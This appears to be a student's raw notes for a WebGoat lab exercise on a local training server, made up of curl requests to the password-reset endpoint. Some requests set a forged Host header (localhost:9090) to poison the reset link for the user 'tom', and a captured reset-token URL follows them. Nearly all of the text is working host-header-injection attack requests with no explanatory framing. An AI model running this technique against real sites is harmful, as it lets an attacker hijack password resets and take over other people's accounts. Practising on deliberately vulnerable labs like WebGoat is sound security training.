curl 'http://localhost:8080/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: http://localhost:8080' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://localhost:8080/WebGoat/start.mvc' \
  -H 'Cookie: JSESSIONID=HJsvM95vXC4KWt9MWcngayJvbZkAt73D2cEqKlVd' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Priority: u=0' \
  --data-raw 'email=tom%40webgoat-cloud.org'



curl -X POST \
  'http://localhost:8080/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: JSESSIONID=TU_JSESSIONID' \
  --data-raw 'email=tom@webgoat-cloud.org'


  http://localhost:8080/WebGoat/PasswordReset/reset/reset-password/ff2b5d82-2997-4df0-9fc5-18481826d75a


curl 'http://localhost:8080/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link' \
  -X POST \
  -H 'Host: localhost:9090' \
  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: http://localhost:8080' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://localhost:8080/WebGoat/start.mvc' \
  -H 'Cookie: JSESSIONID=HJsvM95vXC4KWt9MWcngayJvbZkAt73D2cEqKlVd' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Priority: u=0' \
  --data-raw 'email=tom%40webgoat-cloud.org'


  ---

  curl 'http://localhost:8080/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link' \
  -X POST \
  -H 'Host: localhost:9090' \
  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: http://localhost:8080' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://localhost:8080/WebGoat/start.mvc' \
  -H 'Cookie: JSESSIONID=HJsvM95vXC4KWt9MWcngayJvbZkAt73D2cEqKlVd' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Priority: u=0' \
  --data-raw 'email=grupo-03-facundo-matias%40webgoat-cloud.org'